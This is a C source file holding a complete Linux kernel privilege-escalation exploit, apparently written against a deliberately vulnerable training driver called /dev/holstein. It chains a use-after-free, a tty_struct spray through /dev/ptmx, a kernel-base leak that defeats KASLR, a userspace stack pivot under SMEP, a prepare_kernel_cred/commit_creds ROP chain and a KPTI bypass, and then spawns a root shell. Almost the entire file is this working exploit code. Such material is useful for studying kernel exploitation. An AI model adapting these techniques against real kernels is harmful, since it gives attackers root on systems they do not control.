/**
 * stack_pivot:
 *   - SMEP is enabled
 *   - SMAP is disabled
 *   - KASLR is enabled
 *   - KPTI is enabled
 *
 * When no SMAP is present, we can pivot the stack to userspace using this
 * gadget:
 * 0xffffffff815b5410: mov esp, 0x39000000; ret;
 */

#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/shm.h>
#include <sys/timerfd.h>
#include <unistd.h>

unsigned long kbase, g_buf, current;
unsigned long user_cs, user_ss, user_rsp, user_rflags;
unsigned long *fake_stack;

#define ofs_tty_ops 0xc39c60
#define rop_pop_rdi (kbase + 0x14078a)
#define rop_pop_rcx (kbase + 0x0eb7e4)
#define rop_mov_rdi_rax_rep_movsq (kbase + 0x638e9b)
#define rop_bypass_kpti (kbase + 0x800e26)
#define addr_commit_creds (kbase + 0x0723c0)
#define addr_prepare_kernel_cred (kbase + 0x072560)
#define rop_mov_esp (kbase + 0x5b5410)  // mov esp, 0x39000000; ret;

static void win() {
  char *argv[] = { "/bin/sh", NULL };
  char *envp[] = { NULL };
  puts("[+] win!");
  execve("/bin/sh", argv, envp);
}

static void save_state() {
  asm(
      "movq %%cs, %0\n"
      "movq %%ss, %1\n"
      "movq %%rsp, %2\n"
      "pushfq\n"
      "popq %3\n"
      : "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags)
      :
      : "memory");
}

void fatal(const char *msg) {
  perror(msg);
  exit(1);
}

void build_fake_stack(void) {

  // the stack memory has to be 8-byte aligned
  fake_stack = mmap((void *)0x39000000 - 0x1000, 0x2000,
                        PROT_READ|PROT_WRITE|PROT_EXEC,
                        MAP_ANONYMOUS|MAP_PRIVATE|MAP_FIXED, -1, 0);
  unsigned off = 0x1000;
  unsigned long *chain = (unsigned long*) ((unsigned long) fake_stack + off);
  fake_stack[0] = 0xdead; // put something in the first page so that it gets mapped
                          // alternatively, mmap using MAP_POPULATE flag
  *chain++ = rop_pop_rdi;
  *chain++ = 0;
  *chain++ = addr_prepare_kernel_cred;
  *chain++ = rop_pop_rcx;
  *chain++ = 0;
  *chain++ = rop_mov_rdi_rax_rep_movsq;
  *chain++ = addr_commit_creds;
  *chain++ = rop_bypass_kpti;
  *chain++ = 0xdeadbeef;
  *chain++ = 0xdeadbeef;
  *chain++ = (unsigned long)&win;
  *chain++ = user_cs;
  *chain++ = user_rflags;
  *chain++ = user_rsp;
  *chain++ = user_ss;
}

int main() {
  save_state();

  // First use-after-free. This controlled tty_struct object will be used
  // to store the fake stack and the RIP control address (tty_operations)
  int fd1 = open("/dev/holstein", O_RDWR);
  int fd2 = open("/dev/holstein", O_RDWR);
  if (fd1 == -1 || fd2 == -1)
    fatal("/dev/holstein");
  close(fd1);

  // tty_struct spray
  int spray[50];
  for (int i = 0; i < 50; i++) {
    spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
    if (spray[i] == -1) fatal("/dev/ptmx");
  }

  // KASLRの回避
  char buf[0x400];
  read(fd2, buf, 0x400);
  kbase = *(unsigned long*)&buf[0x18] - ofs_tty_ops;
  g_buf = *(unsigned long*)&buf[0x38] - 0x38;
  printf("kbase = 0x%016lx\n", kbase);
  printf("g_buf = 0x%016lx\n", g_buf);

  // Prepare ROP chain in userspace memory
  build_fake_stack();
  
  // fake tty_operations. It is placed outside the tty_struct (of 704 bytes),
  // to not overwrite any important field member.
  *(unsigned long*)&buf[0x3f8] = rop_mov_esp;
  *(unsigned long*)&buf[0x18] = g_buf + 0x3f8 - 12*8;

  write(fd2, buf, 0x400);

  for (int i = 0; i < 50; i++) {
    ioctl(spray[i], 0xdeadbeef, 0xcafebabe);
  }

  getchar();
  return 0;
}
